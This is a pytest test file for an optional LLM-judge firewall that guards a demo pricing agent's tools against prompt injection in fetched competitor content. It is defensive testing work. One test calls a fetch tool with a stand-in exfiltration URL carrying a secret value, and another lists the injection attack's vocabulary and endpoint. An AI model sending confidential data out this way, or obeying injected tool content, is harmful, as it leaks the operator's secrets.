# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 AI and Me Single-Member Private Company (Humanbound)
"""The Humanbound firewall is an optional, off-by-default defense on the tool boundary.

These tests never call a model or the network: create_agent and get_llm are replaced, and building
building the firewall makes no network call (the judge is only called on first evaluation).
"""
import pytest
import yaml

import agent_core

pytest.importorskip("humanbound_firewall")


@pytest.fixture
def built(monkeypatch):
    """Capture what build_agent hands to create_agent."""
    captured = {}

    def fake_create_agent(model, tools, **kwargs):
        captured.update(model=model, tools=tools, **kwargs)
        return "agent"

    monkeypatch.setattr(agent_core, "create_agent", fake_create_agent)
    monkeypatch.setattr(agent_core, "get_llm", lambda: "llm")
    monkeypatch.delenv("FIREWALL", raising=False)
    monkeypatch.delenv("FETCH_TOOL_NAME", raising=False)
    return captured


def test_firewall_is_off_by_default(built):
    agent_core.build_agent()
    assert not built.get("middleware")


def test_firewall_on_adds_the_middleware(built):
    from humanbound_firewall.integrations.langchain import HumanboundFirewallMiddleware

    agent_core.build_agent(firewall_enabled=True)
    (middleware,) = built["middleware"]
    assert isinstance(middleware, HumanboundFirewallMiddleware)


def test_firewall_can_be_enabled_from_the_environment(built, monkeypatch):
    monkeypatch.setenv("FIREWALL", "on")
    agent_core.build_agent()
    assert len(built["middleware"]) == 1


def test_the_app_judges_with_every_defence_but_enforces_none_whatever_the_env_says(built,
                                                                                 monkeypatch):
    import app
    monkeypatch.setenv("FIREWALL", "on")
    monkeypatch.setenv("GUARD", "on")
    monkeypatch.setenv("GUARDRAIL", "hardened")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    app._agent(rebuild=True)
    import tools
    monkeypatch.setattr(tools, "_fetch", lambda url: "sent")
    fetch = next(t for t in built["tools"] if t.name == agent_core._fetch_name())
    assert fetch.invoke({"url": "http://x/collect?v=118.40"}) == "sent"  # a secret goes out unblocked
    (middleware,) = built["middleware"]
    assert middleware.firewall.guard.mode_for("ingest") == "log"
    assert middleware.firewall.guard.mode_for("recall") == "log"
    assert middleware.firewall.guard.fail == "closed"
    assert app.STATE["firewall_status"] == "on"
    # The prompt guardrail is a start-up setting: it changes what the model reads, so it holds for
    # every run of this server instead of being switched between runs.
    import guardrails
    assert agent_core.SYSTEM_PROMPT == agent_core.minimal_prompt() + guardrails.get("hardened")
    assert app.STATE["guardrail"] == "hardened"


@pytest.mark.parametrize("value, level", [(None, "none"), ("basic", "basic"), ("HARDENED", "hardened"),
                                          ("paranoid", "none")])
def test_the_guardrail_comes_from_the_environment_and_defaults_to_none(built, monkeypatch, value,
                                                                     level):
    import app
    import guardrails
    if value is None:
        monkeypatch.delenv("GUARDRAIL", raising=False)
    else:
        monkeypatch.setenv("GUARDRAIL", value)
    app._agent(rebuild=True)
    assert app.STATE["guardrail"] == level
    assert agent_core.SYSTEM_PROMPT == agent_core.minimal_prompt() + guardrails.get(level)


def test_without_a_judge_key_the_run_still_happens_and_says_the_firewall_is_unavailable(
        built, monkeypatch):
    import app
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    app._agent(rebuild=True)
    assert not built.get("middleware")
    assert app.STATE["firewall_status"].startswith("unavailable")


def test_a_supplied_streamer_is_the_judge_and_block_stays_the_default_mode():
    import metering
    s = metering.MeteredStreamer("gpt-4.1-mini", client=object())
    mw = agent_core.build_firewall_middleware(mode="log", streamer=s)
    assert mw.firewall._streamer is s and mw.firewall.guard.mode_for("ingest") == "log"
    mw = agent_core.build_firewall_middleware(streamer=s)
    assert mw.firewall.guard.mode_for("ingest") == "block"


def _rows(middleware):
    return {b["name"]: b for b in middleware.boundaries}


def test_every_tool_is_a_boundary_and_the_policy_says_which_are_our_own_records(built):
    """Competitor content is ingest; our catalogue and stock are recall (integrity mode)."""
    agent_core.build_agent(firewall_enabled=True)
    rows = _rows(built["middleware"][0])
    assert rows["fetch_url"]["class"] == "ingest"
    assert rows["get_competitor_listing"]["class"] == "ingest"
    assert rows["query_catalogue"]["class"] == "recall"
    assert rows["check_our_stock"]["class"] == "recall"


def test_firewall_follows_a_renamed_fetch_tool(built, monkeypatch):
    monkeypatch.setenv("FETCH_TOOL_NAME", "http_get")
    agent_core.build_agent(firewall_enabled=True)
    rows = _rows(built["middleware"][0])
    assert rows["http_get"]["class"] == "ingest" and "fetch_url" not in rows


def test_pricewatch_guards_the_content_boundaries_not_the_merchandisers_turn(built):
    """The demo is about what comes IN through tools; the human turn is our own UI."""
    agent_core.build_agent(firewall_enabled=True)
    middleware = built["middleware"][0]
    assert middleware.firewall.guard.classes == ("ingest", "recall")
    assert _rows(middleware)["human turn"]["mode"] == "off"


def test_firewall_and_value_dlp_are_independent_knobs(built):
    agent_core.build_agent(guard_enabled=True, firewall_enabled=True)
    assert len(built["middleware"]) == 1
    assert len(built["tools"]) == 4


# --- the default firewall: the LLM judge is the engine; OpenAI when the key is there ---


@pytest.fixture
def captured_from_config(monkeypatch):
    """Capture what build_firewall_middleware asks Firewall.from_config for; build no engine."""
    import humanbound_firewall
    from humanbound_firewall import AgentConfig, Firewall

    seen = {}

    def fake_from_config(path, **kwargs):
        seen.update(path=path, **kwargs)
        return Firewall(AgentConfig(business_scope="x"), classes=kwargs.get("classes", ("request",)))

    monkeypatch.setattr(humanbound_firewall.Firewall, "from_config", staticmethod(fake_from_config))
    monkeypatch.delenv("FIREWALL_JUDGE_MODEL", raising=False)
    return seen


def test_the_default_firewall_reads_the_policy_and_the_demos_classes(captured_from_config, monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    agent_core.build_firewall_middleware()
    assert captured_from_config["path"] == agent_core.FIREWALL_CONFIG
    assert captured_from_config["classes"] == ("ingest", "recall")
    assert captured_from_config["fail"] == "closed"  # HIGH-STAKE: an uncertain verdict withholds
    assert captured_from_config.get("provider") is None  # no key: no judge, escalations pass


def test_the_default_firewall_gets_an_openai_judge_when_the_key_is_present(captured_from_config,
                                                                          monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    agent_core.build_firewall_middleware()
    provider = captured_from_config["provider"]
    assert provider.name.value == "openai"
    assert provider.integration.api_key == "sk-test"
    assert provider.integration.model == "gpt-4.1-mini"  # the study's judge; passes the door page, blocks the attack


def test_the_judge_model_can_be_chosen_from_the_environment(captured_from_config, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    monkeypatch.setenv("FIREWALL_JUDGE_MODEL", "gpt-5-mini")
    agent_core.build_firewall_middleware()
    assert captured_from_config["provider"].integration.model == "gpt-5-mini"


# --- a caller (the benchmark) can supply its own firewall --------------------


def _firewall_built_elsewhere():
    """A Firewall a caller built itself, e.g. one with a metered engine."""
    from humanbound_firewall import AgentConfig, Firewall

    return Firewall(AgentConfig(business_scope="x"))


def test_middleware_can_wrap_a_firewall_built_elsewhere():
    firewall = _firewall_built_elsewhere()
    middleware = agent_core.build_firewall_middleware(firewall=firewall)
    assert middleware.firewall is firewall
    assert set(_rows(middleware)) >= {"fetch_url", "get_competitor_listing", "query_catalogue",
                                       "check_our_stock"}  # the inventory is still decided here


def test_adapter_options_are_passed_through():
    middleware = agent_core.build_firewall_middleware(
        firewall=_firewall_built_elsewhere(), history_messages=3)
    assert middleware._history_messages == 3


def test_agent_uses_a_supplied_middleware_as_is(built):
    middleware = agent_core.build_firewall_middleware(firewall=_firewall_built_elsewhere())
    agent_core.build_agent(firewall_middleware=middleware)
    assert built["middleware"] == [middleware]


def test_a_supplied_middleware_is_not_duplicated_when_the_flag_is_also_on(built):
    middleware = agent_core.build_firewall_middleware(firewall=_firewall_built_elsewhere())
    agent_core.build_agent(firewall_enabled=True, firewall_middleware=middleware)
    assert built["middleware"] == [middleware]


# --- the policy file: the only PriceWatch-specific part of the firewall setup ---


def _policy():
    return yaml.safe_load(agent_core.FIREWALL_CONFIG.read_text())


def test_policy_declares_scope_and_both_intent_lists():
    policy = _policy()
    assert policy["scope"]["business"]
    assert policy["intents"]["permitted"]
    assert policy["intents"]["restricted"]


def test_policy_states_its_stakes_the_documented_way():
    """Risk is declared as a stakes marker in scope.more_info (the documented form the Tier 3
    judge reads: "HIGH-STAKE: ..."), not through an undocumented settings key."""
    import re

    policy = _policy()
    assert re.search(r"\bHIGH-STAKES?\b", policy["scope"]["more_info"])  # internal pricing is confidential
    assert "risk_tolerance" not in policy.get("settings", {})


def test_policy_declares_our_own_record_tools_as_recall():
    """The whitebox refinement: tools that return records WE authored are integrity-checked, not
    judged as outside content. Everything else stays ingest by default."""
    policy = _policy()
    assert policy["capabilities"] == ["tools"]
    assert sorted(policy["tools"]["recall"]) == ["check_our_stock", "query_catalogue"]
    assert "fetch_url" in policy["tools"]["expects"]


def test_policy_is_written_without_knowledge_of_the_attack():
    """Same fairness rule as the prompt guardrails: the defense may know OUR system (what is
    confidential), never the attack's vocabulary, endpoint, or encoding."""
    text = agent_core.FIREWALL_CONFIG.read_text().lower()
    for attack_term in ("collect", "calibrat", "verification", "acquisition basis", "interleav",
                        "live-offer", "exchange", "127.0.0.1"):
        assert attack_term not in text


# --- the web app exposes the toggle ------------------------------------------


def test_app_reports_the_defences_instead_of_on_off_flags():
    from fastapi.testclient import TestClient

    import app as webapp

    health = TestClient(webapp.app).get("/health").json()
    assert "firewall" not in health and "dlp" not in health and "guardrail" not in health
    assert set(health["defences"]) == {"prompt_guardrail", "dlp", "firewall", "firewall_judge"}


def test_health_reports_the_start_up_guardrail_before_any_run(monkeypatch):
    from fastapi.testclient import TestClient

    import app as webapp
    monkeypatch.setenv("GUARDRAIL", "hardened")
    monkeypatch.setitem(webapp.STATE, "agent", None)  # nothing has run yet
    health = TestClient(webapp.app).get("/health").json()
    assert health["defences"]["prompt_guardrail"] == "hardened"
